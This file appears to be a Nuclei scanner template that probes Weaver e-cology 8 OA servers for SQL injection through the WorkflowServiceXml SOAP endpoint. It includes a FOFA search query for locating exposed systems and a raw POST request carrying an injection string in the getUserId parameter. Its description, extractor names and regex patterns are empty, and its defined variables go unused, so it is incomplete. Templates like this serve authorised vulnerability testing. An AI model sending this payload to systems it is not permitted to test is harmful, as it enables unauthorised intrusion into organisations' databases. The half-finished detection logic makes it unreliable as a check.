nuclei-poc/nuclei-ecology8-WorkflowServiceXml-sqli.yaml

id: ecology8-WorkflowServiceXml-sqli
info:
  name: ecology8-WorkflowServiceXml-sqli
  author: sb    
  severity: critical
  description: 
  metadata:
    fofa-query: app="泛微-OA（e-cology）" && body="系统默认"
variables:
  s1: '{{rand_base(5, "56789")}}'
  str: '{{rand_base(4)}}'
  rand: '{{rand_base(3)}}'
  
http:
  - raw:
      - |      
        POST /services/WorkflowServiceXml HTTP/1.1
        Cookie: ecology_JSessionid=aaaBARi23vekqguNfrVDy
        Content-Type: text/xml;charset=UTF-8
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
            <web:getUserId>
          <web:string>loginId = ? ;*--</web:string>
        <web:string>xx</web:string>
            </web:getUserId>
          </soapenv:Body>
        </soapenv:Envelope>
     
    extractors:
      - type: regex
        name: 
        part: body
        group: 1
        internal: true
        regex:
          - ''

      - type: regex
        name: 
        part: body
        group: 1
        internal: true
        regex:
          - ''    
    
    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(header,"text/xml")'
          